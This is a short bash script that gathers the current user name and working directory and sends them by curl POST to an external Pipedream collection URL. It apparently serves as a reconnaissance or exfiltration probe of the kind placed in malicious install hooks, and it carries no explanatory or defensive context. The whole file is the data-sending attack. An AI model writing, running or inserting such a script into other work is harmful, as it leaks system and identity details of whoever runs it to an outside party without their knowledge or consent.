#!/bin/bash

whoami_val=$(whoami)
username_val=$(id -un)
cwd_val=$(pwd)

curl -X POST https://eovkc8nvko37a3p.m.pipedream.net \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "whoami=$whoami_val&username=$username_val&cwd=$cwd_val"
